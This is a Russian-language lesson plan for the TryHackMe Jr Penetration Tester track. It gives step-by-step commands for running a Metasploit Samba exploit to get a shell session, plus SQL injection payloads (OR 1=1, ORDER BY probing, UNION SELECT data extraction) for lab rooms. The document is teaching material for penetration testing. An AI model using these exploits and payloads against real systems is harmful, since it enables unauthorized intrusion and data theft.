# Занятие 50. TryHackMe (Jr Penetration Tester): 1-2 комнаты за занятие

## Теория

Трек **Jr Penetration Tester** на TryHackMe ориентирован на подготовку к профессии пентестера. Включает:

- **Network Security** — сканирование сети, работа с Nmap, перечисление сервисов
- **Web Hacking** — OWASP Top 10, SQL-инъекции, XSS, директория-траверсал
- **Privilege Escalation** — Linux и Windows повышение привилегий
- **Metasploit** — фреймворк для эксплуатации уязвимостей
- **Active Directory** — базовые атаки на AD

**Структура комнаты:**
- Task (задача) → вопросы → флаги (формат: `THM{...}`)
- Виртуальная машина запускается в облаке или доступна по VPN
- Документация и подсказки внутри комнаты

## Практическое занятие

### Комната 1: "Metasploit: Introduction"

**Шаг 1. Запуск Metasploit**
```bash
msfconsole
```

**Шаг 2. Поиск модулей**
```bash
search type:exploit platform:linux
```

**Шаг 3. Использование эксплойта**
```bash
use exploit/linux/samba/is_known_pipename
set RHOSTS <target_ip>
set RPORT 445
exploit
```

**Шаг 4. Работа с сессией**
- После успешной эксплуатации получаем сессию (shell)
- `sessions -l` — список сессий
- `sessions -i 1` — подключение к сессии

### Комната 2: "SQL Injection"

**Шаг 1. Обнаружение уязвимости**
Тестируем параметры: `?id=1' OR 1=1--`

**Шаг 2. Определение количества столбцов**
```sql
' ORDER BY 1-- 
' ORDER BY 2--
' ORDER BY 3--
```

**Шаг 3. Использование UNION**
```sql
' UNION SELECT 1,2,3--
```

**Шаг 4. Извлечение данных**
```sql
' UNION SELECT database(), user(), version()--
```

Практика: пройдите комнату, найдите все скрытые таблицы и получите флаги.
